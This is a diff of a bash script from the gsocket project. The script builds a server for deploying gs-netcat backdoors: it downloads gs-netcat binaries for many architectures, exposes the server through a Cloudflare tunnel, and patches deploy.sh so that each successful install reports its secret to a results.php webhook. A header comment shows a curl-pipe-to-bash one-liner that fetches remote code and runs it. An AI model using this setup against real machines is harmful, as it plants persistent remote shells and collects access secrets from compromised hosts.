@@ -17,19 +17,31 @@
 #   LOG=results.log bash -c "$(curl -fsSL https://gsocket.io/deploy/xs)"
 
 [[ -z $PORT ]] && PORT="32803"
+[[ -z $GS_BRANCH ]] && GS_BRANCH="master"
+BINDIR="${GS_BRANCH}/bin"
+[[ $GS_BRANCH == master ]] && BINDIR="bin"
+
+DEPLOY_SH_NAME="y"
+
 DATA_DIR="gs-www-data"
 packages=()
-packages+=("x86_64-alpine.tar.gz")
-packages+=("aarch64-linux.tar.gz")
-packages+=("arm-linux.tar.gz")
-packages+=("i386-alpine.tar.gz")
-packages+=("i686-cygwin.tar.gz")
-packages+=("mips32-alpine.tar.gz")
-packages+=("mips64-alpine.tar.gz")
-packages+=("mipsel32-alpine.tar.gz")
-packages+=("x86_64-osx.tar.gz")
-packages+=("x86_64-freebsd.tar.gz")
-packages+=("x86_64-openbsd.tar.gz")
+packages+=("linux-x86_64")
+packages+=("linux-aarch64")
+packages+=("linux-mips64")
+packages+=("linux-mips32")
+packages+=("linux-mipsel")
+packages+=("linux-i686")
+packages+=("linux-arm")
+packages+=("linux-armv6")
+packages+=("linux-armv7l")
+packages+=("linux-powerpc")
+packages+=("linux-powerpc64")
+packages+=("linux-powerpcle")
+packages+=("linux-powerpc64le")
+# packages+=("i686-cygwin.tar.gz")
+packages+=("macOS-x86_64")
+packages+=("freebsd-x86_64")
+packages+=("openbsd-x86_64")
 
 [[ -t 1 ]] && {
 	CY="\033[1;33m" # yellow
@@ -124,14 +136,14 @@ command -v python >/dev/null || {
 
 [[ ! -d "${DATA_DIR}/bin" ]] && mkdir -p "${DATA_DIR}/bin"
 [[ ! -f "${DATA_DIR}/y" ]] && {
-    echo -e "Downloading ${CDY}x${CN} (e.g. deploy.sh)"
-    curl -fsSL 'https://github.com/hackerschoice/gsocket/raw/master/deploy/deploy.sh' --output "${DATA_DIR}/y"
+    echo -e "Downloading ${CDY}${DEPLOY_SH_NAME}${CN} (e.g. deploy.sh)"
+    curl -fsSL "https://github.com/hackerschoice/gsocket/raw/${GS_BRANCH}/deploy/deploy.sh" --output "${DATA_DIR}/${DEPLOY_SH_NAME}"
 }
 
 for n in "${packages[@]}"; do
-    [[ -f "${DATA_DIR}/bin/gs-netcat_${n}" ]] && continue
-    echo -e "Downloading ${CDY}gs-netcat_${n}${CN}..."
-    curl -fsSL "https://github.com/hackerschoice/binary/raw/main/gsocket/bin/gs-netcat_${n}" --output "${DATA_DIR}/bin/gs-netcat_${n}"
+    [[ -f "${DATA_DIR}/bin/gs-netcat_mini-${n}" ]] && continue
+    echo -e "Downloading ${CDY}gs-netcat_mini-${n}${CN}..."
+    curl -fsSL "https://gsocket.io/${BINDIR}/gs-netcat_mini-${n}" --output "${DATA_DIR}/bin/gs-netcat_mini-${n}"
 done
 
 start "Cloudflare" "cloudflare.log" cloudflared tunnel --url "http://127.0.0.1:${PORT}" --no-autoupdate
@@ -157,9 +169,10 @@ str="${str//[^[:alnum:]].-}"  # sanitize
 URL_BASE="https://${str}"
 
 # update deploy.sh
-sed "s|^URL_BASE=.*|URL_BASE=\"${URL_BASE}\"|" -i "${DATA_DIR}/y"
-sed "s|^gs_deploy_webhook=.*|gs_deploy_webhook='${URL_BASE}/results.php?s=\${GS_SECRET}'|" -i "${DATA_DIR}/y"
-sed 's|^GS_WEBHOOK_404_OK=.*|GS_WEBHOOK_404_OK=1|' -i "${DATA_DIR}/y"
+sed "s|^URL_BASE=.*|URL_BASE=\"${URL_BASE}\"|" -i "${DATA_DIR}/${DEPLOY_SH_NAME}"
+sed "s|^IS_DEPLOY_SERVER=.*|IS_DEPLOY_SERVER=1|" -i "${DATA_DIR}/${DEPLOY_SH_NAME}"
+sed "s|^gs_deploy_webhook=.*|gs_deploy_webhook='${URL_BASE}/results.php?s=\${GS_SECRET}'|" -i "${DATA_DIR}/${DEPLOY_SH_NAME}"
+sed 's|^GS_WEBHOOK_404_OK=.*|GS_WEBHOOK_404_OK=1|' -i "${DATA_DIR}/${DEPLOY_SH_NAME}"
 
 echo -e "\
 ${CDG}All successfull deployments will be shown below.${CN}
